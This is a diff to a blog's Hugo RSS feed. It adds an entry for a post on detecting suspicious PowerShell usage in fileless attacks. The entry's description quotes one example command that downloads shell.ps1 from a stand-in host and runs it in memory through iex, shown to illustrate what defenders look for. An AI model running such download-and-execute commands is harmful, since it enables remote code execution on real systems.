@@ -6,8 +6,15 @@
     <description>Recent content on It&#39;s a Dev&#39;s world</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Sun, 20 Jul 2025 17:34:16 +0200</lastBuildDate>
+    <lastBuildDate>Sun, 05 Oct 2025 19:57:34 +0200</lastBuildDate>
     <atom:link href="https://jackleila.github.io/programming/public/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Detecting suspicious PowerShell usage</title>
+      <link>https://jackleila.github.io/programming/public/post/detecting_suspicious_powershell_usage/</link>
+      <pubDate>Sun, 05 Oct 2025 19:57:34 +0200</pubDate>
+      <guid>https://jackleila.github.io/programming/public/post/detecting_suspicious_powershell_usage/</guid>
+      <description>Detecting Suspicious PowerShell Usage In the recent years there was an increase in the fileless techniques that abuse Powershell and other applications (LOTLs) to download and execute malware. These attacks occur generally in memory, which makes detection more complicated than traditional malware.&#xA;Let&amp;rsquo;s take a look at this example:&#xA;powershell.exe -command &amp;quot;iex(New-Object Net.WebClient).DownloadString(‘http://10.10.13.1/shell.ps1’)&amp;quot;&#xA;The script shell.ps1 is downloaded and directly executed in memory through iex. Many times, attackers will encode or offuscate the commands to avoid the detection.</description>
+    </item>
     <item>
       <title>Configuring Filebeat and Logstash with Opensearch</title>
       <link>https://jackleila.github.io/programming/public/post/configuring-filebeat-and-logstash/</link>
